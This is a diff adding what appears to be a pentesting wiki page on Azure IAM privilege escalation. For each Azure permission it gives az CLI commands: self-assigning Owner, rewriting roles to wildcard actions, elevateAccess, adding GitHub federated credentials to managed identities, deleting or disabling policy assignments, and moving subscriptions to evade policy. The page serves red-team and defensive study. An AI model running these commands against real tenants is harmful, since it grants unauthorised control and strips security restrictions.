@@ -1,0 +1,186 @@
+# Az - Azure IAM Privesc (Authorization)
+
+## Azure IAM
+
+Fore more information check:
+
+### Microsoft.Authorization/roleAssignments/write
+
+This permission allows to assign roles to principals over a specific scope, allowing an attacker to escalate privileges by assigning himself a more privileged role:
+
+```bash
+# Example
+az role assignment create --role Owner --assignee "24efe8cf-c59e-45c2-a5c7-c7e552a07170" --scope "/subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.KeyVault/vaults/testing-1231234"
+```
+
+### Microsoft.Authorization/roleDefinitions/Write
+
+This permission allows to modify the permissions granted by a role, allowing an attacker to escalate privileges by granting more permissions to a role he has assigned.
+
+Create the file `role.json` with the following **content**:
+
+```json
+{
+  "roleName": "<name of the role>",
+  "Name": "<name of the role>",
+  "IsCustom": true,
+  "Description": "Custom role with elevated privileges",
+  "Actions": ["*"],
+  "NotActions": [],
+  "DataActions": ["*"],
+  "NotDataActions": [],
+  "AssignableScopes": ["/subscriptions/<subscription-id>"],
+  "id": "/subscriptions/<subscription-id>/providers/Microsoft.Authorization/roleDefinitions/<role-id>",
+}
+```
+
+Then update the role permissions with the previous definition calling:
+
+```bash
+az role definition update --role-definition role.json
+```
+
+### Microsoft.Authorization/elevateAccess/action
+
+This permissions allows to elevate privileges and be able to assign permissions to any principal to Azure resources. It's meant to be given to Entra ID Global Administrators so they can also manage permissions over Azure resources.
+
+> [!TIP]
+> I think the user need to be Global Administrator in Entrad ID for the elevate call to work.
+
+```bash
+# Call elevate
+az rest --method POST --uri "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"
+
+# Grant a user the Owner role
+az role assignment create --assignee "<obeject-id>" --role "Owner" --scope "/"
+```
+
+### Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/write
+
+This permission allows to add Federated credentials to managed identities. E.g. give access to Github Actions in a repo to a managed identity. Then, it allows to **access any user defined managed identity**.
+
+Example command to give access to a repo in Github to the a managed identity:
+
+```bash
+# Generic example:
+az rest --method PUT \
+  --uri "https://management.azure.com//subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<managed-identity-name>/federatedIdentityCredentials/<name-new-federated-creds>?api-version=2023-01-31" \
+  --headers "Content-Type=application/json" \
+  --body '{"properties":{"issuer":"https://token.actions.githubusercontent.com","subject":"repo:<org-name>/<repo-name>:ref:refs/heads/<branch-name>","audiences":["api://AzureADTokenExchange"]}}'
+
+# Example with specific data:
+az rest --method PUT \
+  --uri "https://management.azure.com//subscriptions/92913047-10a6-2376-82a4-6f04b2d03798/resourceGroups/Resource_Group_1/providers/Microsoft.ManagedIdentity/userAssignedIdentities/funcGithub-id-913c/federatedIdentityCredentials/CustomGH2?api-version=2023-01-31" \
+  --headers "Content-Type=application/json" \
+  --body '{"properties":{"issuer":"https://token.actions.githubusercontent.com","subject":"repo:carlospolop/azure_func4:ref:refs/heads/main","audiences":["api://AzureADTokenExchange"]}}'
+```
+
+### Microsoft.Authorization/policyAssignments/write | Microsoft.Authorization/policyAssignments/delete
+
+An attacker with the permission `Microsoft.Authorization/policyAssignments/write` or `Microsoft.Authorization/policyAssignments/delete` over a management group, subscription, or resource group can **modify or delete Azure policy assignments**, potentially **disabling security restrictions** that block specific operations.
+
+This allows access to resources or functionalities that were previously protected by the policy.
+
+**Delete a policy assignment:**
+
+```bash
+az policy assignment delete \
+    --name "<policyAssignmentName>" \
+    --scope "/providers/Microsoft.Management/managementGroups/<managementGroupId>"
+```
+
+**Disable a policy assignment:**
+
+```bash
+az policy assignment update \
+    --name "<policyAssignmentName>" \
+    --scope "/providers/Microsoft.Management/managementGroups/<managementGroupId>" \
+    --enforcement-mode Disabled
+```
+
+**Verify the changes:**
+
+```bash
+# List policy assignments
+az policy assignment list \
+    --scope "/providers/Microsoft.Management/managementGroups/<managementGroupId>"
+
+# Show specific policy assignment details
+az policy assignment show \
+    --name "<policyAssignmentName>" \
+    --scope "/providers/Microsoft.Management/managementGroups/<managementGroupId>"
+```
+
+### Microsoft.Authorization/policyDefinitions/write
+
+An attacker with the permission `Microsoft.Authorization/policyDefinitions/write` can **modify Azure policy definitions**, changing the rules that control security restrictions across the environment.
+
+For example, a policy that limits the allowed regions for creating resources can be modified to allow any region, or the policy effect can be changed to make it ineffective.
+
+**Modify a policy definition:**
+
+```bash
+az policy definition update \
+    --name "<policyDefinitionName>" \
+    --rules @updated-policy-rules.json
+```
+
+**Verify the changes:**
+
+```bash
+az policy definition list --output table
+
+az policy definition show --name "<policyDefinitionName>"
+```
+
+### Microsoft.Management/managementGroups/write
+
+An attacker with the permission `Microsoft.Management/managementGroups/write` can **modify the hierarchical structure of management groups** or **create new management groups**, potentially evading restrictive policies applied at higher levels.
+
+For example, an attacker can create a new management group without restrictive policies and then move subscriptions to it.
+
+**Create a new management group:**
+
+```bash
+az account management-group create \
+    --name "yourMGname" \
+    --display-name "yourMGDisplayName"
+```
+
+**Modify a management group hierarchy:**
+
+```bash
+az account management-group update \
+    --name "<managementGroupId>" \
+    --parent "/providers/Microsoft.Management/managementGroups/<parentGroupId>"
+```
+
+**Verify the changes:**
+
+```bash
+az account management-group list --output table
+
+az account management-group show \
+    --name "<managementGroupId>" \
+    --expand
+```
+
+### Microsoft.Management/managementGroups/subscriptions/write
+
+An attacker with the permission `Microsoft.Management/managementGroups/subscriptions/write` can **move subscriptions between management groups**, potentially **evading restrictive policies** by moving a subscription to a group with less restrictive or no policies.
+
+**Move a subscription to a different management group:**
+
+```bash
+az account management-group subscription add \
+    --name "<managementGroupName>" \
+    --subscription "<subscriptionId>"
+```
+
+**Verify the changes:**
+
+```bash
+az account management-group subscription show \
+    --name "<managementGroupId>" \
+    --subscription "<subscriptionId>"
+```
